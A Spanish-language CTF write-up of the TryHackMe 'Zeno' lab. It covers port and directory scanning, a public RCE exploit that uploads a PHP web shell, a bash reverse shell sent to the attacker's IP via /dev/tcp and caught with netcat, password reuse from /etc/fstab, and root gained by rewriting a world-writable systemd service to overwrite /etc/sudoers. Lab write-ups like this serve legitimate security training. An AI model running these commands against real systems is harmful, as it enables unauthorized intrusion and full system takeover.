---
title : "Zeno - Write Up - Español"
date : 2021-10-23T13:13:28+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel medio en TryHackMe."
tags : ["RCE","service","sudo","RMS","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/zeno)  | Medio  |  [Biniru](https://tryhackme.com/p/Biniru)  |

## Reconocimiento

¡Bienvenid@ de nuevo!

¡Comencemos esta máquina con un escaneo `nmap`, para ver qué servicios se están ejecutando!

```bash
╰─ lanfran@parrot ❯ sudo nmap 10.10.229.206 -p- -sS --min-rate 5000 -n -Pn                                                                            ─╯
[sudo] password for lanfran: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-23 13:16 CEST
Nmap scan report for 10.10.229.206
Host is up (0.14s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
22/tcp    open  ssh
12340/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
```
¡Excelente! ¡Un servicio `ssh` en el puerto` 22` y un servicio `desconocido(servidor web)` ejecutándose en el puerto `12340`! 

¡Ahora escaneemos el puerto web con `gobuster`, para ver qué archivos están ocultos!

```bash
╰─ lanfran@parrot ❯ scan_long http://10.10.229.206:12340/                                                                                             ─╯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.229.206:12340/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/10/23 13:38:39 Starting gobuster
===============================================================
/rms (Status: 301)
===============================================================
2021/10/23 13:43:56 Finished
===============================================================
```
¡Una carpeta con una página web ejecutándose!

¡Veamos esta web!

![web](web.png)

`Restaurant Management System` está diciendo la página, ¡tal vez podamos encontrar un exploit público para ella!

¡Y si! Tenemos uno [aquí](exp.py)

Ejecutarlo creará un shell php donde podemos obtener una shell reversa.

```bash
╰─ lanfran@parrot ❯ python3 exp.py http://10.10.229.206:12340/rms/                                                                                    ─╯

    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|



Credits : All InfoSec (Raja Ji's) Group
[+] Restaurant Management System Exploit, Uploading Shell
[+] Shell Uploaded. Please check the URL : http://10.10.229.206:12340/rms/images/reverse-shell.php
```

¡Podemos comprobar si la shell está funcionando con un comando común!

```bash
╰─ lanfran@parrot ❯ curl "http://10.10.229.206:12340/rms/images/reverse-shell.php?cmd=id"                                                             ─╯
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```
¡Y si! El servidor se está ejecutando con el usuario `apache`.

## Acceso inicial - Usuario

Consigamos una shell reversa!

```bash
[Terminal 1]

╰─ lanfran@parrot ❯ curl http://10.10.229.206:12340/rms/images/reverse-shell.php\?cmd\=bash+-i+%3E%26+/dev/tcp/10.9.2.74/1337+0%3E%261                ─╯

------

[Terminal 2]

╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                                     ─╯
listening on [any] 1337 ...
connect to [10.9.2.74] from (UNKNOWN) [10.10.229.206] 39332
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```
Ahora, escaneemos la máquina con `Linpeas` o manualmente...

¡Podemos encontrar un archivo, almacenando los sistemas de archivos compartidos! y dentro de ella una contraseña para el usuario `zeno`.

```bash
bash-4.2$ cat /etc/fstab

#
# /etc/fstab
# Created by anaconda on Tue Jun  8 23:56:31 2021
#
# Accessible filesystems, by reference, are maintained under '/dev/disk'
# See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info
#
/dev/mapper/centos-root	/	xfs	defaults	0 0
UUID=507d63a9-d8cc-401c-a660-bd57acfd41b2	/boot	xfs	defaults	0 0
/dev/mapper/centos-swap	swap	swap	defaults	0 0
#//10.10.10.10/secret-share	/mnt/secret-share	cifs	_netdev,vers=3.0,ro,username=zeno,password=F[REDACTADO]a,domain=localdomain,soft	0 0
```

Tal vez podamos probar esta contraseña con el usuario de esta máquina `edward` ...

```bash
bash-4.2$ su edward
Password: 
[edward@zeno home]$ id
uid=1000(edward) gid=1000(edward) groups=1000(edward) context=system_u:system_r:httpd_t:s0
[edward@zeno home]$ cat /home/edward/user.txt 
THM{[REDACTADO]}
```
¡Sip, funcionó!

## Root

¡Ahora escalemos a root!

```bash
[edward@zeno home]$ sudo -l
Matching Defaults entries for edward on zeno:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User edward may run the following commands on zeno:
    (ALL) NOPASSWD: /usr/sbin/reboot
```
¡Podemos ejecutar como sudo el binario `reboot`! 

Buscando los archivos de esta máquina, encontramos que el archivo `zeno-monitoring.service` tiene escritura para todos.
```bash
[edward@zeno home]$ ls -la /etc/systemd/system/zeno-monitoring.service
-rw-rw-rw-. 1 root root 141 Sep 21 22:24 /etc/systemd/system/zeno-monitoring.service
```
¡Así que podemos editarlo para ejecutar un exploit!

```bash
[edward@zeno home]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
```

Editándolo, debería verse así:

```bash
[edward@zeno home]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'

[Install]
WantedBy=multi-user.target
```
Este exploit agregará nuestro usuario al archivo `sudoers`, por lo que podemos ejecutar todos los comandos con `sudo`.

Después de eso, ¡reiniciemos la máquina y veamos si el exploit funcionó!
```bash
[edward@zeno home]$ sudo /usr/sbin/reboot 
```
Espere a que la máquina se reinicie y conéctese a través de `ssh` con el usuario `edward`.

```bash
╰─ lanfran@parrot ❯ ssh edward@10.10.229.206                                                                                                          ─╯
edward@10.10.229.206's password: 
Last login: Sat Oct 23 14:38:36 2021
[edward@zeno ~]$ id
uid=1000(edward) gid=1000(edward) groups=1000(edward) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[edward@zeno ~]$ sudo -l
User edward may run the following commands on zeno:
    (root) NOPASSWD: ALL
```
¡El exploit funcionó! ¡Podemos ejecutar cualquier comando con sudo!
```bash
[edward@zeno ~]$ sudo su
[root@zeno edward]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@zeno edward]# cat /root/root.txt 
THM{[REDACTADO]}
```
Eso es todo de mi parte, ¡espero que lo encuentre útil!